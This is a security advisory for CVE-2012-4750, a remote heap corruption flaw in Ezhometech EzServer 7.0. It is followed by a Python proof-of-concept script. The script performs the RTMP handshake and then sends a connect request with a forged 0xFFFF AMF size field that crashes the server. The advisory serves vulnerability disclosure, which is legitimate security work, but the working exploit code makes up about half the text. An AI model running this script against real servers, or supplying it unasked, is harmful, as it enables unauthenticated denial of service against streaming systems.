@@ -1,0 +1,114 @@
+[Title]:
+Ezhometech EzServer 7.0 Remote Heap Corruption Vulnerability
+
+[Description]:
+EzServer is a software for audio and video streaming adopted by various companies worldwide. Version 7.0 is  affected by a remote heap corruption vulnerability. Version 6.x is not affected by this issue, as does not implement RTMP support.
+
+[Affected Software]:
+http://www.ezhometech.com/ezserver.htm
+
+
+[Credits]:
+Lorenzo Cantoni
+
+[CVE]:
+CVE-2012-4750
+
+[CVSS]:
+9.3 (AV:N/AC:M/Au:N/C:C/I:C/A:C)
+
+[Impact]:
+A remote unauthenticated attacker can DoS the application. Remote Command Execution could be possible, however an exploit has yet to be developed.
+
+
+[Details]:
+The vulnerability is caused by the following lines of code:
+
+.text:00474533                 cmp     [ebp-33A0], 80h
+.text:0047453D                 jle     short loc_47458E
+.text:0047453F                 mov     eax, [ebp-33A0h]
+.text:00474545                 sub     eax, 80h
+.text:0047454A                 push    eax             ; Size
+.text:0047454B                 mov     ecx, [ebp-33CCh]
+.text:00474551                 add     ecx, 81h
+.text:00474557                 push    ecx             ; Src
+.text:00474558                 mov     edx, [ebp-33CCh]
+.text:0047455E                 add     edx, 80h
+.text:00474564                 push    edx             ; Dst
+.text:00474565                 call    _memcpy_0
+
+The application pass to memcpy() an uncontrolled size, which is directly taken from the AMF request in the RTMP packet.After have successfully completed the RTMP handshake, an attacker can send a malformed AMF request embedded in the RTMP session, with an high value for the 'size' field (2 bytes, such as 0xFFFF) and a lower-sized 'string' (such as 'connect'). This result in a heap corruption and a crash for the application.
+
+[Fix]:
+Support for the RTMP protocol appears disabled (but not fully removed) in version 7.1. However there is no official response from the vendor (see disclosure).
+
+[Proof of Concept code]:
+http://pastebin.com/k05djr6C
+
+[Disclosure]:
+09/09/2012: Vendor contacted.
+07/10/2012: No response. Sent another mail.
+13/10/2012: Still no response. Disclosure.
+
+
+#Ezhometech Ezserver 7.0 Remote Heap Corruption Vulnerability POC code
+#Author: Lorenzo Cantoni
+#CVE: CVE-2012-4750
+#Link to vulnerable software: http://www.4shared.com/zip/eVs9I2Gf/ezserver70001_win.html
+
+from socket import *
+import sys
+import os
+import time
+
+version = "\x03"
+zero_pad="\x00" * 4
+
+c1_finger= "\x05\xaf\x52\x83\x0b\xd2\x11\xa5\x48\x88\x94\xcc\x0b\x05\x22\x55\x04\x87\x11\xcd\x19\x85\x10\xa9\xe9\x43\xbf\x8b\x83\x91\x98\x45\x5f\xbd\x41\x07\x30\x05\xd3\x03\x99\x0b\x88\xd9\xb6\x36\x56\xd4\x3c\xfe\xc8\xed\x83\x74\x8f\x4b\x0f\x0f\xc5\x12\x02\x16\x79\x4b\x22\xa0\x54\xe5\xbc\x58\xab\xd8\xc4\x10\x96\x07\x08\x84\x39\x34\x53\xce\x50\x96\x94\xaf\xbe\xab\xe0"
+
+c1 = os.urandom(1537 - len(version+ zero_pad+c1_finger))
+
+c0c1 = version + zero_pad + c1 + c1_finger 
+
+
+if len(sys.argv) >=2:
+	server = sys.argv[1]
+else:
+	server ="192.168.1.65"
+
+
+s = socket(AF_INET, SOCK_STREAM)
+
+s.connect((server,1935))
+
+# Handshake C0+C1 (sent by client)
+
+s.send(c0c1)
+time.sleep(2)
+
+# Handshake S0+S1+S2 (sent by server)
+s0s1s2= s.recv(1700)
+time.sleep(2)
+# Handshake C2
+#parse the payload which has to be echoed back to the server
+echo = s0s1s2[1:1537]
+
+c2 = echo 
+s.send(c2)
+time.sleep(2)
+
+# connect('live')
+size = '\x00\x00\x79'
+header = '\x03\x00\x00\x00' + size +'\x14\x00\x00\x00\x00'
+size_2 = '\xff\xff' # TRIGGERS THE VULNERABILITY - legit size: \x00\x07
+body_0 = '\x02' + size_2
+req = '\x63\x6f\x6e\x6e\x65\x63\x74' # connect
+body_1 = '\x00\x3f\xf0\x00\x00\x00\x00\x00\x00\x03\x00\x03\x61\x70\x70\x02\x00\x04'
+param = '\x6c\x69\x76\x65' #live
+body_2 = '\x00\x08\x66\x6c\x61\x73\x68\x56\x65\x72\x02\x00\x0d\x4c\x4e\x58\x20\x39\x2c\x30\x2c\x31\x32\x34\x2c\x32\x00\x05\x74\x63\x55\x72\x6c\x02\x00\x1d'
+url = 'rtmp://' + str(sys.argv[1]) + ':1935/live'
+body_3 = '\x00\x04\x66\x70\x61\x64\x01\x00\x00\x0c\x63\x61\x70\x61\x62\x69\x6c\x69\x74\x69\x65\x73\x00\x40\x2e\x00\x00\x00\x00\x00\x00\xc3\x00\x0b\x61\x75\x64\x69\x6f\x43\x6f\x64\x65\x63\x73\x00\x40\x99\x9c\x00\x00\x00\x00\x00\x00\x0b\x76\x69\x64\x65\x6f\x43\x6f\x64\x65\x63\x73\x00\x40\x6f\x80\x00\x00\x00\x00\x00\x00\x0d\x76\x69\x64\x65\x6f\x46\x75\x6e\x63\x74\x69\x6f\x6e\x00\x3f\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x09'
+     
+conn_live = header+ body_0 + req + body_1 + param + body_2 + url + body_3
+
+s.send(conn_live)
